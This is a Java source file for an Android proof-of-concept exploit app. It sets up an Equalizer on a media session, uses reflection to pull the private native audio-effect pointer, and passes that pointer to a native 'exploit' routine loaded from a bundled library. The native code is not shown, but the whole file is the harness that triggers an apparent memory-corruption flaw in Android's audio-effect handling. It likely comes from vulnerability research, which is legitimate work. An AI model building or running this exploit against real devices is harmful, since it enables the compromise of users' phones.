package com.poc.exploit;

import android.app.Activity;
import android.os.Bundle;
import  android.media.audiofx.AudioEffect;
import  android.media.audiofx.Equalizer;
import  android.media.MediaPlayer;
import android.util.Log;
import java.lang.reflect.Field;
import  java.lang.Long;
import  java.lang.Exception;

public class MyActivity extends Activity
{
    private native int exploit(long ptr);
    static {
        System.loadLibrary("exploit");
    }
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        AudioEffect.Descriptor[] descriptors = AudioEffect.queryEffects();
        for(AudioEffect.Descriptor descriptor : descriptors){
            Log.i("AudioEffectPOC", "connectMode:" + descriptor.connectMode + " implementor:" + descriptor.implementor 
                + " name:" + descriptor.name + " type:" + descriptor.type);
        } 
        try{
            final MediaPlayer mp = MediaPlayer.create(this, R.raw.hangouts_message);
            Equalizer equlizer = new Equalizer(0, mp.getAudioSessionId());
            equlizer.setEnabled(true);
            short bands = equlizer.getNumberOfBands();
            final short minEQLevel = equlizer.getBandLevelRange()[0];
            final short maxEQLevel = equlizer.getBandLevelRange()[1];

            for (short i = 0; i < bands; ++i) {
                equlizer.setBandLevel(i, maxEQLevel);
            }

            Field mNativeAudioEffectField = AudioEffect.class.getDeclaredField("mNativeAudioEffect");
            mNativeAudioEffectField.setAccessible(true);
            long ptr = mNativeAudioEffectField.getLong(equlizer);
            Log.i("AudioEffectPOC", "ptr = 0x"+Long.toHexString(ptr));
            int ret = exploit(ptr);
            Log.i("AudioEffectPOC", "return = 0x" + Integer.toHexString(ret));
            mp.setOnCompletionListener(new MediaPlayer.OnCompletionListener(){
                @Override
                public void onCompletion(MediaPlayer mediaPlayer){
                    mp.release();
                }
            });
            mp.start();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }
}
